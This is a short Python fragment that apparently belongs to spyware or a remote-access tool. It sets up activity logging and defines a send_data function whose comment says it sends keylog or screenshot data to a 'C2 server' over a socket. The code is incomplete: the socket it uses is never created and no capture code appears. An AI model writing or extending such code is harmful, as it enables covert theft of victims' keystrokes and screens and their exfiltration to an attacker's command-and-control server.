import logging
import socket

# Set up logging
logging.basicConfig(filename="activity.log", level=logging.INFO)

def log_activity(message):
    logging.info(message)

def send_data(data):
    # Send data (e.g., keylog or screenshot) to the C2 server
    client_socket.send(data.encode())
